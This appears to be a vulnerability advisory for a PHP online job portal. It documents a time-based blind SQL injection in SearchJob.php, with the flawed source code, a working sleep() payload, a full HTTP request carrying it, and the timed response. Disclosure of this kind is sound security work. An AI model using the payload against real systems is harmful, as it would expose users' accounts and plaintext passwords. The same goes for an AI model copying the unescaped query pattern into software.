## ONLINE_JOB_PORTAL_SYSTEM SearchJob.php Time-Based Blind SQL Injection Vulnerability

### I. Vulnerability Impact

The `cmbQual`, `cmbCompany` and `cmbArea` parameters of `JobSeeker/SearchJob.php` are concatenated into the job search query without any escaping, so an attacker can inject SQL expressions into the `WHERE` clause. By placing a `sleep()` call inside the injected expression the attacker can delay the response at will and read arbitrary data from the database character by character. The stolen data includes the `jobseeker_reg` and `employer_reg` tables, which hold the accounts and plaintext passwords of every job seeker and employer registered on the portal.

### II. Source Code Analysis

The vulnerability resides in `JobSeeker/SearchJob.php`, lines 12-21 where the value-sanitising helper is defined:

```php
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "")
{
  $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;

//  $theValue = function_exists("mysql_real_escape_string") ? mysqli_real_escape_string($theValue) : mysqli_escape_string($theValue);
//
  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
```

and in the query that consumes the user input, lines 69-83:

```php
$colname_Recordset2 = "-1";
if (isset($_POST['cmbQual'])) {
  $colname_Recordset2 = $_POST['cmbQual'];
}
...
$query_Recordset2 = sprintf("SELECT * FROM job_master WHERE MinQualification = %s and CompanyName=%s and JobTitle=%s", GetSQLValueString($colname_Recordset2, "text"),GetSQLValueString($colname2_Recordset2, "text"),GetSQLValueString($colname3_Recordset2, "text"));
$Recordset2 = mysqli_query($con,$query_Recordset2) or die(mysqli_error());
```

`GetSQLValueString()` is the Dreamweaver helper that is supposed to escape its argument, but the line that would call `mysqli_real_escape_string()` is commented out on line 16. All that remains for the `text` type is wrapping the value in single quotes, so the input is placed into the statement verbatim. `get_magic_quotes_gpc()` was removed in PHP 5.4 and always evaluates to false, so the only processing applied to the parameter is the optional `stripslashes()`.

The three POST parameters are therefore substituted into the `WHERE MinQualification = ... and CompanyName=... and JobTitle=...` clause unchanged, and a single quote in any of them closes the corresponding literal and turns the rest of the parameter into SQL. The authentication check at the top of the file (lines 3-7) calls `header('location:../index.php')` but never calls `exit()`, so `$query_Recordset2` is still executed for unauthenticated requests.

Error feedback is unavailable here because `mysqli_error()` is called without its required connection argument, which produces a PHP warning rather than the MySQL error message, so the injection has to be confirmed through response timing.

### III. Payload

The core injection payload is:

```
M.B.A'and(select*from(select sleep(2))a)='
```

The resulting SQL statement executed by the server becomes:

```sql
SELECT * FROM job_master WHERE MinQualification = 'M.B.A'and(select*from(select sleep(2))a)='' and CompanyName='Wipro Infotech' and JobTitle='Software Professional Required'
```

The leading `M.B.A'` closes the `MinQualification` literal, `and(select*from(select sleep(2))a)` wraps `sleep()` in a derived table so that it can be used as a scalar expression and forces MySQL to wait two seconds, and the trailing `=''` re-balances the quote that `GetSQLValueString()` appends. The subquery evaluates to `0` and `0=''` is true, so the remaining search conditions still apply and the page is rendered normally once the delay has elapsed.

```
POST /JobSeeker/SearchJob.php HTTP/1.1
Host: job
Content-Length: 129
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36 Edg/156.0.0.0
Origin: http://job
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://job/JobSeeker/SearchJob.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=a8lsjo418cuqjme60vfvhv159c
Connection: keep-alive

cmbQual=M.B.A'and(select*from(select+sleep(2))a)='&cmbCompany=Wipro+Infotech&cmbArea=Software+Professional+Required&button=Search
```

The response is returned after 2.05 seconds instead of the 0.06 seconds a normal search takes, and the body is the complete search page rather than an error, which confirms that the injected `sleep()` was evaluated inside the `WHERE` clause:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Fri, 30 Oct 2026 08:22:02 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
X-Powered-By: PHP/7.3.4
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
...
<title>JOB PORTAL</title>
...
<option value="Wipro Infotech">Wipro Infotech</option>
```

### IV. Source Download

https://code-projects.org/online-job-portal-system-in-php-with-source-code/



![image-20261030162434675](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20261030162434675.png)
